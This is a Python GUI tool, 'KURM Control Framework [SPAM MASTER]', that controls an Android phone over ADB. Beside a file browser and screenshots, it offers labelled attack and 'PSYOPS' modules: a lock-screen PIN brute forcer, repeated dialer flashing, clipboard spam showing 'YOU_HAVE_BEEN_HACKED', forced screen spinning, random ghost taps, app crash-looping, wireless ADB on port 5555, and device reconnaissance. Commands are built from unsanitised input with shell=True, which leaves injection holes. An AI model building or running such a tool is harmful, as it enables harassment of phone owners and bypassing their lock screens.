import customtkinter as ctk
import subprocess
import threading
import time
import os
import re
import random
from tkinter import filedialog, messagebox, ttk
import tkinter as tk

# --- 設定區 ---
ADB_CMD = "adb"
SCRCPY_CMD = "scrcpy"

# KURM ASCII Logo
ASCII_KURM = r"""
  _  __  _   _   ____    __  __ 
 | |/ / | | | | |  _ \  |  \/  |
 | ' /  | | | | | |_) | | |\/| |
 | . \  | |_| | |  _ <  | |  | |
 |_|\_\  \___/  |_| \_\ |_|  |_|
      [ SPAM MASTER ]
"""

# 配色方案
COLOR_BG = "#000000"        
COLOR_SIDEBAR = "#050505"   
COLOR_BTN_NORMAL = "#151515" 
COLOR_BTN_HOVER = "#8B0000"  
COLOR_TEXT_ACCENT = "#C0392B" 
COLOR_TEXT_INFO = "#00FF00" 

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

class KurmToolkit(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("KURM Control Framework [v5.3 SPAM MASTER]")
        self.geometry("1200x850") 
        self.configure(fg_color=COLOR_BG)

        self.device_connected = False
        self.device_model = ctk.StringVar(value="Searching Target...")
        self.current_path = "/sdcard/" 
        
        self.recon_bat = ctk.StringVar(value="BAT: --%")
        self.recon_ver = ctk.StringVar(value="OS: --")
        self.recon_ip = ctk.StringVar(value="IP: --")
        self.recon_mem = ctk.StringVar(value="RAM: --")

        self.chaos_running = False 

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.setup_sidebar()
        self.setup_tabs()
        
        threading.Thread(target=self.monitor_device, daemon=True).start()
        threading.Thread(target=self.loop_recon_info, daemon=True).start()
        
        self.log("KURM v5.3 Online. Notification Modules Ready.")

    def setup_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, width=220, corner_radius=0, fg_color=COLOR_SIDEBAR, border_width=1, border_color="#111")
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        
        ctk.CTkLabel(self.sidebar, text="KURM", font=("Verdana", 32, "bold"), text_color="#FFF").pack(pady=(30, 5))
        ctk.CTkLabel(self.sidebar, text="Spam Master", font=("Arial", 10), text_color="#666").pack(pady=(0, 20))
        
        self.status_label = ctk.CTkLabel(self.sidebar, text="● OFFLINE", font=("Arial", 14, "bold"), text_color="gray")
        self.status_label.pack(pady=10)
        ctk.CTkLabel(self.sidebar, textvariable=self.device_model, text_color="#AAA").pack()

        ctk.CTkLabel(self.sidebar, text="── NETWORK ──", text_color="#444").pack(pady=(20, 5))
        self.create_side_btn("Wireless Connect", self.ghost_connect_dialog)
        self.create_side_btn("Enable TCP/IP", self.enable_tcpip)

        ctk.CTkLabel(self.sidebar, text="── SYSTEM ──", text_color="#444").pack(pady=(20, 5))
        self.create_side_btn("Start Scrcpy", self.launch_scrcpy)
        self.create_side_btn("Reboot Device", self.reboot_device)
        self.create_side_btn("Restart ADB", lambda: self.run_bg("kill-server"))
        self.create_side_btn("Exit", self.destroy)

        self.console = ctk.CTkTextbox(self.sidebar, height=200, fg_color="#000", text_color="#0F0", font=("Consolas", 10))
        self.console.pack(side="bottom", fill="x", padx=10, pady=10)
        self.console.insert("0.0", "> KURM Terminal Active.\n")

    def setup_tabs(self):
        self.tabview = ctk.CTkTabview(
            self, 
            fg_color="#080808", 
            text_color="#EEE", 
            segmented_button_fg_color="#111", 
            segmented_button_selected_color=COLOR_BTN_HOVER,
            segmented_button_unselected_color="#000",
            segmented_button_selected_hover_color="#A00000",
            segmented_button_unselected_hover_color="#222"
        )
        self.tabview.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)

        self.tab_dash = self.tabview.add("DASHBOARD")
        self.tab_files = self.tabview.add("FILE EXPLORER")
        self.tab_bot = self.tabview.add("MACRO BOT")
        self.tab_chaos = self.tabview.add("CHAOS & SPAM") # 改名

        self.setup_dashboard(self.tab_dash)
        self.setup_file_explorer(self.tab_files)
        self.setup_macro_bot(self.tab_bot)
        self.setup_chaos_ops(self.tab_chaos)

    # --- 1. DASHBOARD ---
    def setup_dashboard(self, parent):
        scroll_frame = ctk.CTkScrollableFrame(parent, fg_color="transparent")
        scroll_frame.pack(fill="both", expand=True)
        
        ctk.CTkLabel(scroll_frame, text=ASCII_KURM, font=("Courier New", 14, "bold"), text_color=COLOR_TEXT_ACCENT).pack(pady=20)

        recon_frame = ctk.CTkFrame(scroll_frame, fg_color="#0a0a0a", border_width=1, border_color="#333")
        recon_frame.pack(fill="x", padx=20, pady=10)
        
        info_grid = ctk.CTkFrame(recon_frame, fg_color="transparent")
        info_grid.pack(fill="x", padx=10, pady=10)
        self.create_info_label(info_grid, self.recon_ver, 0, 0)
        self.create_info_label(info_grid, self.recon_bat, 0, 1)
        self.create_info_label(info_grid, self.recon_ip, 0, 2)
        self.create_info_label(info_grid, self.recon_mem, 0, 3)

        f_controls = ctk.CTkFrame(scroll_frame, fg_color="transparent")
        f_controls.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(f_controls, text="BASIC OPS", font=("Arial", 12, "bold"), text_color="#888").pack(anchor="w")
        self.create_btn(f_controls, "Take Screenshot", self.take_screenshot)
        self.create_btn(f_controls, "Record Screen", self.record_screen)
        
        ctk.CTkLabel(f_controls, text="INJECTION", font=("Arial", 12, "bold"), text_color="#888").pack(anchor="w", pady=(20,0))
        self.create_btn(f_controls, "Type Text", self.input_text_dialog)
        self.create_btn(f_controls, "Open URL", self.input_url_dialog)
        
        ctk.CTkLabel(f_controls, text="QUICK ATTACKS", font=("Arial", 12, "bold"), text_color=COLOR_TEXT_ACCENT).pack(anchor="w", pady=(20,0))
        
        grid_chaos = ctk.CTkFrame(f_controls, fg_color="transparent")
        grid_chaos.pack(fill="x")
        
        # 攻擊按鈕矩陣
        self.create_btn_grid(grid_chaos, "[ATTACK] Ghost Call", self.ghost_call_dialog, 0, 0)
        self.create_btn_grid(grid_chaos, "[ATTACK] Clipboard Spam", self.start_clipboard_spam, 0, 1)
        self.create_btn_grid(grid_chaos, "[ATTACK] App Glitcher", self.app_spammer_dialog, 1, 0)
        self.create_btn_grid(grid_chaos, "[ATTACK] Brute Force", self.brute_force_dialog, 1, 1)

    def create_info_label(self, parent, variable, r, c):
        f = ctk.CTkFrame(parent, fg_color="#111", width=120, height=40)
        f.grid(row=r, column=c, padx=5, sticky="ew")
        parent.grid_columnconfigure(c, weight=1)
        ctk.CTkLabel(f, textvariable=variable, font=("Consolas", 12, "bold"), text_color=COLOR_TEXT_INFO).place(relx=0.5, rely=0.5, anchor="center")

    def create_btn_grid(self, parent, text, cmd, r, c):
        btn = ctk.CTkButton(parent, text=text, command=cmd, height=35, fg_color=COLOR_BTN_NORMAL, hover_color=COLOR_BTN_HOVER, text_color="#DDD")
        btn.grid(row=r, column=c, padx=5, pady=5, sticky="ew")
        parent.grid_columnconfigure(c, weight=1)

    # --- 2. FILE EXPLORER ---
    def setup_file_explorer(self, parent):
        top_bar = ctk.CTkFrame(parent, fg_color="transparent")
        top_bar.pack(fill="x", padx=10, pady=5)
        
        self.path_label = ctk.CTkLabel(top_bar, text=self.current_path, font=("Consolas", 12), text_color="yellow", anchor="w")
        self.path_label.pack(side="left", fill="x", expand=True)
        
        ctk.CTkButton(top_bar, text="Refresh", width=80, command=self.refresh_file_list, fg_color="#222", hover_color=COLOR_BTN_HOVER).pack(side="right", padx=5)
        ctk.CTkButton(top_bar, text="UP ..", width=60, command=self.go_up_dir, fg_color="#333", hover_color="#555").pack(side="right", padx=5)

        style = ttk.Style()
        style.theme_use("default")
        style.configure("Treeview", background="#111", foreground="white", fieldbackground="#111", rowheight=25)
        style.map('Treeview', background=[('selected', COLOR_BTN_HOVER)])
        
        self.tree = ttk.Treeview(parent, columns=("Size", "Type"), show="tree headings", selectmode="browse")
        self.tree.heading("#0", text="Name", anchor="w")
        self.tree.heading("Size", text="Size", anchor="center")
        self.tree.heading("Type", text="Type", anchor="center")
        self.tree.column("#0", width=400, anchor="w")
        self.tree.column("Size", width=100, anchor="center")
        self.tree.column("Type", width=80, anchor="center")
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)
        self.tree.bind("<Double-1>", self.on_file_double_click)

    def refresh_file_list(self):
        if not self.device_connected: return
        self.path_label.configure(text=self.current_path)
        for item in self.tree.get_children(): self.tree.delete(item)
        threading.Thread(target=self._load_files_thread).start()

    def _load_files_thread(self):
        cmd = f'{ADB_CMD} shell ls -lpl "{self.current_path}"' 
        try:
            res = subprocess.check_output(cmd, shell=True, text=True)
            lines = res.split('\n')
            for line in lines[1:]: 
                parts = line.split()
                if len(parts) > 7:
                    perms = parts[0]
                    size = parts[4]
                    name = " ".join(parts[7:]) 
                    is_dir = perms.startswith('d')
                    type_str = "<DIR>" if is_dir else "FILE"
                    icon = "📁 " if is_dir else "📄 "
                    self.tree.insert("", "end", text=f"{icon}{name}", values=(size, type_str))
        except: self.log("Error reading directory.")

    def on_file_double_click(self, event):
        item_id = self.tree.selection()[0]
        item = self.tree.item(item_id)
        name = item['text'][2:] 
        type_str = item['values'][1]
        if type_str == "<DIR>":
            self.current_path = self.current_path + name + "/"
            self.refresh_file_list()
        else:
            self.pull_file_tree(name)

    def go_up_dir(self):
        if self.current_path == "/": return
        self.current_path = os.path.dirname(os.path.dirname(self.current_path)) + "/"
        self.refresh_file_list()

    def pull_file_tree(self, filename):
        full_path = self.current_path + filename
        save_path = filedialog.asksaveasfilename(initialfile=filename)
        if save_path:
            self.log(f"Downloading {filename}...")
            threading.Thread(target=lambda: subprocess.run(f'{ADB_CMD} pull "{full_path}" "{save_path}"', shell=True)).start()

    # --- 3. MACRO BOT ---
    def setup_macro_bot(self, parent):
        ctk.CTkLabel(parent, text="AUTOMATION BOT", font=("Courier", 20, "bold"), text_color="#FFF").pack(pady=20)
        frame_spam = ctk.CTkFrame(parent)
        frame_spam.pack(fill="x", padx=20, pady=10)
        ctk.CTkLabel(frame_spam, text="TAP SPAMMER (XY Clicker)", font=("Arial", 12, "bold")).pack(pady=5)
        f_coords = ctk.CTkFrame(frame_spam, fg_color="transparent")
        f_coords.pack()
        self.entry_x = ctk.CTkEntry(f_coords, placeholder_text="X", width=80)
        self.entry_x.pack(side="left", padx=5)
        self.entry_y = ctk.CTkEntry(f_coords, placeholder_text="Y", width=80)
        self.entry_y.pack(side="left", padx=5)
        self.spam_running = False
        self.btn_spam = ctk.CTkButton(frame_spam, text="START SPAM", fg_color=COLOR_BTN_HOVER, command=self.toggle_spam)
        self.btn_spam.pack(pady=10)

    def toggle_spam(self):
        if not self.spam_running:
            try:
                x = int(self.entry_x.get())
                y = int(self.entry_y.get())
                self.spam_running = True
                self.btn_spam.configure(text="STOP SPAM", fg_color="#333")
                threading.Thread(target=lambda: self._run_spam(x, y)).start()
            except: self.log("Invalid Coordinates.")
        else:
            self.spam_running = False
            self.btn_spam.configure(text="START SPAM", fg_color=COLOR_BTN_HOVER)

    def _run_spam(self, x, y):
        self.log(f"Bot started at {x},{y}")
        while self.spam_running:
            subprocess.run(f"{ADB_CMD} shell input tap {x} {y}", shell=True)
            time.sleep(0.1)
        self.log("Bot Stopped.")

    # --- 4. CHAOS & PSYOPS ---
    def setup_chaos_ops(self, parent):
        ctk.CTkLabel(parent, text="PSYOPS & DISORIENT", font=("Courier", 20, "bold"), text_color=COLOR_TEXT_ACCENT).pack(pady=20)
        
        # 1. 幽靈來電
        self.create_btn(parent, "[PSYOPS] Ghost Call (Fake Dialer)", self.ghost_call_dialog)
        
        # 2. 剪貼簿轟炸
        self.create_btn(parent, "[PSYOPS] Clipboard Toast Spam", self.start_clipboard_spam)
        
        # 3. 其他
        self.create_btn(parent, "[DISORIENT] Screen Spin Loop", self.start_rotation_attack)
        self.create_btn(parent, "[DISORIENT] Ghost Touch", self.start_ghost_touch)
        self.create_btn(parent, "[ATTACK] App Glitcher (Spam)", self.app_spammer_dialog)
        
        ctk.CTkButton(parent, text="STOP ALL ATTACKS", fg_color="red", text_color="white", command=self.stop_chaos).pack(pady=20, fill="x", padx=20)

    def stop_chaos(self):
        self.chaos_running = False
        self.spam_running = False
        self.log("Stopping all threads...")
        self.adb_bg("shell settings put system accelerometer_rotation 1")
        if hasattr(self, 'btn_spam'): self.btn_spam.configure(text="START SPAM", fg_color=COLOR_BTN_HOVER)

    # [NEW] 幽靈來電：瘋狂開啟撥號介面
    def ghost_call_dialog(self):
        d = ctk.CTkInputDialog(text="Number to flash (e.g. 666):", title="Ghost Call")
        num = d.get_input()
        if num:
            self.chaos_running = True
            threading.Thread(target=lambda: self._run_ghost_call(num)).start()

    def _run_ghost_call(self, num):
        self.log(f"Ghost Call Started: {num}")
        for i in range(50):
            if not self.chaos_running: break
            # 啟動撥號介面
            subprocess.run(f'{ADB_CMD} shell am start -a android.intent.action.DIAL -d tel:{num}', shell=True)
            time.sleep(0.5)
            # 關閉它 (造成閃爍)
            subprocess.run(f"{ADB_CMD} shell input keyevent 4", shell=True) # Back button
            time.sleep(0.3)
        self.log("Ghost Call Stopped.")

    # [NEW] 剪貼簿轟炸：瘋狂貼上，觸發系統通知
    def start_clipboard_spam(self):
        if messagebox.askyesno("PSYOPS", "Start Clipboard Spam?\n(Triggers 'Pasted from...' toast)"):
            self.chaos_running = True
            threading.Thread(target=self._run_clipboard_spam).start()

    def _run_clipboard_spam(self):
        self.log("Clipboard Spam Started...")
        # 先複製一段文字
        subprocess.run(f'{ADB_CMD} shell input text "YOU_HAVE_BEEN_HACKED"', shell=True)
        # 全選複製 (Ctrl+A, Ctrl+C) -> ADB 比較難做，我們直接用貼上指令 spam
        while self.chaos_running:
            # 發送「貼上」鍵值 (KEYCODE_PASTE = 279)
            # 這在 Android 12+ 會觸發系統級的灰色通知
            subprocess.run(f"{ADB_CMD} shell input keyevent 279", shell=True)
            time.sleep(0.3)
        self.log("Clipboard Spam Stopped.")

    def start_rotation_attack(self):
        if messagebox.askyesno("CHAOS", "Start Screen Rotation?"):
            self.chaos_running = True
            threading.Thread(target=self._run_rotation).start()

    def _run_rotation(self):
        self.log("Rotation Attack Started...")
        subprocess.run(f"{ADB_CMD} shell settings put system accelerometer_rotation 0", shell=True)
        while self.chaos_running:
            rot = random.randint(0, 3)
            subprocess.run(f"{ADB_CMD} shell settings put system user_rotation {rot}", shell=True)
            time.sleep(0.5)

    def start_ghost_touch(self):
         if messagebox.askyesno("CHAOS", "Start Ghost Touch?"):
            self.chaos_running = True
            threading.Thread(target=self._run_ghost_touch).start()
            
    def _run_ghost_touch(self):
        self.log("Ghost Touch Started...")
        while self.chaos_running:
            x = random.randint(100, 900)
            y = random.randint(100, 1800)
            subprocess.run(f"{ADB_CMD} shell input tap {x} {y}", shell=True)
            time.sleep(0.2)

    def enable_tcpip(self):
        self.log("Enabling ADB TCP/IP (5555)...")
        self.adb_bg("tcpip 5555")

    def ghost_connect_dialog(self):
        d = ctk.CTkInputDialog(text="IP Address:", title="Wireless")
        ip = d.get_input()
        if ip: threading.Thread(target=lambda: self._run_connect(ip)).start()

    def _run_connect(self, ip):
        if ":" not in ip: ip += ":5555"
        res = subprocess.run(f"{ADB_CMD} connect {ip}", shell=True, capture_output=True, text=True)
        self.log(res.stdout.strip())

    def loop_recon_info(self):
        while True:
            if self.device_connected:
                try:
                    bat = re.search(r"level: (\d+)", subprocess.run(f"{ADB_CMD} shell dumpsys battery", shell=True, capture_output=True, text=True).stdout)
                    if bat: self.recon_bat.set(f"BAT: {bat.group(1)}%")
                    
                    ver = subprocess.check_output(f"{ADB_CMD} shell getprop ro.build.version.release", shell=True, text=True).strip()
                    self.recon_ver.set(f"AND: {ver}")
                    
                    ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", subprocess.run(f"{ADB_CMD} shell ip addr show wlan0", shell=True, capture_output=True, text=True).stdout)
                    self.recon_ip.set(f"IP: {ip.group(1)}" if ip else "IP: N/A")
                    
                    mem = re.search(r"MemTotal:\s+(\d+)", subprocess.run(f"{ADB_CMD} shell cat /proc/meminfo", shell=True, capture_output=True, text=True).stdout)
                    if mem: self.recon_mem.set(f"RAM: {round(int(mem.group(1))/1024/1024, 1)}G")
                except: pass
            else:
                self.recon_bat.set("BAT: --")
                self.recon_ver.set("OS: --")
                self.recon_ip.set("IP: --")
                self.recon_mem.set("RAM: --")
            time.sleep(5)

    def brute_force_dialog(self):
        d = ctk.CTkInputDialog(text="Start PIN:", title="Attack")
        p = d.get_input()
        if p and len(p)==4: threading.Thread(target=lambda: self._run_brute_force(int(p))).start()

    def _run_brute_force(self, start_num):
        self.log("Brute Force Started...")
        for i in range(50):
            if not self.chaos_running and i>0: break
            pin = f"{start_num+i:04d}"
            self.log(f"Trying: {pin}")
            subprocess.run(f"{ADB_CMD} shell input keyevent 26", shell=True)
            subprocess.run(f"{ADB_CMD} shell input keyevent 82", shell=True)
            time.sleep(0.2)
            subprocess.run(f"{ADB_CMD} shell input text {pin}", shell=True)
            subprocess.run(f"{ADB_CMD} shell input keyevent 66", shell=True)
            time.sleep(1)

    def app_spammer_dialog(self):
        d = ctk.CTkInputDialog(text="Package:", title="Glitch")
        p = d.get_input()
        if p: 
            self.chaos_running = True
            threading.Thread(target=lambda: self._run_app_spammer(p)).start()

    def _run_app_spammer(self, pkg):
        self.log(f"Glitch Attack on {pkg}")
        for i in range(100):
            if not self.chaos_running: break
            subprocess.Popen(f"{ADB_CMD} shell monkey -p {pkg} -c android.intent.category.LAUNCHER 1", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.1)
            subprocess.Popen(f"{ADB_CMD} shell am force-stop {pkg}", shell=True)
            time.sleep(0.1)

    def create_btn(self, parent, text, cmd):
        ctk.CTkButton(parent, text=text, command=cmd, height=35, fg_color=COLOR_BTN_NORMAL, hover_color=COLOR_BTN_HOVER, text_color="#DDD").pack(fill="x", padx=10, pady=5)
    
    def create_side_btn(self, text, cmd):
        ctk.CTkButton(self.sidebar, text=text, command=cmd, fg_color="transparent", hover_color="#222", border_width=1, border_color="#222", text_color="#AAA").pack(fill="x", padx=20, pady=3)

    def log(self, txt):
        self.console.configure(state="normal")
        self.console.insert("end", f"> {txt}\n")
        self.console.see("end")
        self.console.configure(state="disabled")

    def monitor_device(self):
        while True:
            try:
                res = subprocess.run([ADB_CMD, "devices", "-l"], capture_output=True, text=True)
                if "device product" in res.stdout:
                    if not self.device_connected:
                        self.device_connected = True
                        self.status_label.configure(text="● ONLINE", text_color="#2ECC71")
                        try:
                            model = subprocess.check_output([ADB_CMD, "shell", "getprop", "ro.product.model"], text=True).strip()
                            self.device_model.set(model)
                            self.log(f"Connected: {model}")
                            self.refresh_file_list()
                        except: pass
                else:
                    if self.device_connected:
                        self.device_connected = False
                        self.status_label.configure(text="● OFFLINE", text_color="gray")
                        self.device_model.set("Scanning...")
            except: pass
            time.sleep(2)

    def adb_bg(self, cmd):
        threading.Thread(target=lambda: self._run_adb(cmd)).start()
    
    def run_bg(self, cmd):
        threading.Thread(target=lambda: self._run_adb(cmd)).start()

    def _run_adb(self, cmd):
        try: subprocess.run(f"{ADB_CMD} {cmd}", shell=True)
        except: pass

    def launch_scrcpy(self):
        self.log("Launching SCRCPY...")
        threading.Thread(target=lambda: subprocess.Popen(SCRCPY_CMD, shell=True)).start()

    def record_screen(self):
        f = f"kurm_rec_{int(time.time())}.mp4"
        self.log(f"Recording: {f}")
        threading.Thread(target=lambda: subprocess.Popen(f"{SCRCPY_CMD} --record {f}", shell=True)).start()

    def install_apk(self):
        f = filedialog.askopenfilename(filetypes=[("APK", "*.apk")])
        if f: self.adb_bg(f'install -r "{f}"')

    def take_screenshot(self):
        self.log("Screenshot...")
        t = int(time.time())
        self.adb_bg(f"shell screencap -p /sdcard/s.png && {ADB_CMD} pull /sdcard/s.png ./kurm_{t}.png && {ADB_CMD} shell rm /sdcard/s.png")

    def input_text_dialog(self):
        d = ctk.CTkInputDialog(text="Text:", title="Inject")
        t = d.get_input()
        if t: self.adb_bg(f"shell input text {t.replace(' ', '%s')}")

    def input_url_dialog(self):
        d = ctk.CTkInputDialog(text="URL:", title="Open")
        u = d.get_input()
        if u: self.adb_bg(f"shell am start -a android.intent.action.VIEW -d {u}")

    def uninstall_app_dialog(self):
        d = ctk.CTkInputDialog(text="Package:", title="Uninstall")
        p = d.get_input()
        if p: self.adb_bg(f"uninstall {p}")

    def reboot_device(self):
        if messagebox.askyesno("KURM", "Reboot?"): self.adb_bg("reboot")

if __name__ == "__main__":
    app = KurmToolkit()
    app.mainloop()